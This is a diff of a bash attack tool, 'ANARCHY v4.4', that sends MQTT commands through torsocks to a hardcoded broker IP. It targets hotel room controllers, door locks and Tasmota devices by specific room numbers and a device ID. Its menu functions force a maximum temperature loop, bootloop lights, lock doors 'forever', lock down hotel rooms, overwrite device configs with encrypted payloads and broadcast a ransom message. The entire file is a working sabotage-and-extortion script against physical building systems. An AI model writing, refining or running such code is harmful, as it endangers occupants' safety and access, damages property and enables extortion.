@@ -1,8 +1,8 @@
 #!/bin/bash
-
+# ANARCHY v4.4 - WILDCARD PUBLISH FIXED
 set -euo pipefail
 
-MQTT_HOST="104.198241.70"
+MQTT_HOST="104.198.241.70"
 MQTT_PORT="1883"
 TOR="torsocks"
 MAX_TEMP="99.9"
@@ -27,10 +27,10 @@ TOR_PUB_Q1() {
 show_menu() {
     clear
     cat << 'EOF'
-┌─ TRUSTEDF57 - EOF FIXED ──────────────────────┐
-│ 1) FORCE ONLINE + LOCK                          │
-│ 2) MAX TEMP LOOP (99.9°C)                       │
-│ 3) LIGHTS BOOTLOOP (255)                        │
+┌─ TRUSTEDF57 - WILDCARD FIXED ─────────────────┐
+│ 1) FORCE ONLINE (Specific)                      │
+│ 2) MAX TEMP LOOP                                │
+│ 3) LIGHTS BOOTLOOP                              │
 │ 4) DOORS LOCKED FOREVER                         │
 │ 5) HOTEL ROOMS LOCKDOWN                         │
 │ 6) TASMOTA RULE LOCK                            │
@@ -42,28 +42,31 @@ show_menu() {
 EOF
 }
 
+# FIXED: Specific topics NO wildcards for PUBLISH
 force_online() {
-    echo "[+] Force online LWT discovery..."
-    TOR_PUB "#LWT" "Online"
-    TOR_PUB_Q1 "hotel/rooms/+/LWT" "Online"
-    TOR_PUB_Q1 "digy/digy/+/LWT" "Online"
-    TOR_PUB_Q1 "tasmota/discovery/+/LWT" "Online"
+    echo "[+] Force online - SPECIFIC devices..."
+    TOR_PUB "cmnd/tasmota/LWT" "Online"
+    TOR_PUB_Q1 "hotel/rooms/1205/LWT" "Online"
+    TOR_PUB_Q1 "hotel/rooms/1001/LWT" "Online"
+    TOR_PUB_Q1 "digy/digy/236/LWT" "Online"
+    TOR_PUB_Q1 "digy/digy/0235/LWT" "Online"
+    TOR_PUB_Q1 "tasmota/discovery/4CEBD69E0A49/LWT" "Online"
 }
 
 temp_loop() {
     echo "[🌡️] MAX TEMP ${MAX_TEMP}..."
-    TOR_PUB_Q1 "cmnd/tasmota/+/Temp" "${MAX_TEMP}"
-    TOR_PUB_Q1 "tele/+/SENSOR" "{\"Temp\":${MAX_TEMP}}"
+    TOR_PUB_Q1 "cmnd/tasmota/Temp" "${MAX_TEMP}"
+    TOR_PUB_Q1 "tele/tasmota/SENSOR" "{\"Temp\":${MAX_TEMP}}"
     local loop_cmd="Rule1 ON tele/%topic%/SENSOR#Temp DO Temp ${MAX_TEMP} ENDON;Rule1 1"
-    TOR_PUB_Q1 "cmnd/tasmota/+/Rule1" "${loop_cmd}"
+    TOR_PUB_Q1 "cmnd/tasmota/Rule1" "${loop_cmd}"
 }
 
 lights_loop() {
     echo "[💡] LIGHTS BOOTLOOP..."
     local light_rule="Rule1 ON System#Boot DO Backlog Power1 1;Delay 500;Power1 0;Delay 500;Power1 1;Brightness ${MAX_BRIGHT};Power1 1;ENDON;Rule1 1"
-    TOR_PUB "cmnd/tasmota/+/Backlog" "${light_rule}"
-    TOR_PUB "cmnd/tasmota/+/Power1" "1"
-    TOR_PUB "cmnd/tasmota/+/Brightness" "${MAX_BRIGHT}"
+    TOR_PUB "cmnd/tasmota/Backlog" "${light_rule}"
+    TOR_PUB "cmnd/tasmota/Power1" "1"
+    TOR_PUB "cmnd/tasmota/Brightness" "${MAX_BRIGHT}"
 }
 
 doors_locked() {
@@ -102,10 +105,13 @@ tasmota_lock() {
 }
 
 ransom_broadcast() {
-    echo "[📢] RANSOM Broadcast..."
-    TOR_PUB "hotel/rooms/+/birth" "${RANSOM_MSG}"
-    TOR_PUB "digy/digy/#" "${RANSOM_MSG}"
-    TOR_PUB "tasmota/discovery/+/config" "${RANSOM_MSG}"
+    echo "[📢] RANSOM Broadcast - MULTI TOPIC..."
+    # Specific rooms/doors invece di wildcard
+    TOR_PUB "hotel/rooms/1205/birth" "${RANSOM_MSG}"
+    TOR_PUB "hotel/rooms/1001/birth" "${RANSOM_MSG}"
+    TOR_PUB "digy/digy/236/door" "${RANSOM_MSG}"
+    TOR_PUB "digy/digy/0235/door" "${RANSOM_MSG}"
+    TOR_PUB "tasmota/discovery/4CEBD69E0A49/config" "${RANSOM_MSG}"
     TOR_PUB "${SYS}/broker/version" "${RANSOM_MSG}"
 }
 
@@ -113,12 +119,13 @@ lock_configs() {
     echo "[🔒] Encrypt configs..."
     local locked_json="{\"status\":\"${LOCKED_STATUS}\",\"control\":\"BLOCKED\"}"
     local crypt_json=$(ENCRYPT_PAYLOAD "${locked_json}")
-    TOR_PUB "tasmota/discovery/+/config" "${crypt_json}"
-    TOR_PUB "hotel/rooms/+/config" "${crypt_json}"
+    TOR_PUB "tasmota/discovery/4CEBD69E0A49/config" "${crypt_json}"
+    TOR_PUB "hotel/rooms/1205/config" "${crypt_json}"
+    TOR_PUB "hotel/rooms/1001/config" "${crypt_json}"
 }
 
 total_anarchy() {
-    echo "🎪 TOTAL ANARCHY v4.3..."
+    echo "🎪 TOTAL ANARCHY v4.4..."
     force_online
     temp_loop
     lights_loop
@@ -127,13 +134,13 @@ total_anarchy() {
     tasmota_lock
     ransom_broadcast
     lock_configs
-    echo "✅ ANARCHY DEPLOYED"
+    echo "✅ ANARCHY DEPLOYED - NO WILDCARDS"
 }
 
-# MAIN LOOP - NO FUNCTION SCOPE ISSUES
+# MAIN LOOP
 while true; do
     show_menu
-    read -r CHOICE </dev/tty  # FIXED: Direct stdin + explicit CHOICE
+    read -r CHOICE </dev/tty
     case "${CHOICE}" in
         1) force_online ;;
         2) temp_loop ;;
@@ -145,8 +152,8 @@ while true; do
         8) lock_configs ;;
         9) total_anarchy ;;
         0) echo "[+] Exiting..."; exit 0 ;;
-        *) echo "❌ Invalid choice: ${CHOICE}. Try 0-9." ;;
+        *) echo "❌ Invalid: ${CHOICE}" ;;
     esac
     echo
-    read -r -p "Press ENTER to continue..." </dev/tty
+    read -r -p "Press ENTER..." </dev/tty
 done
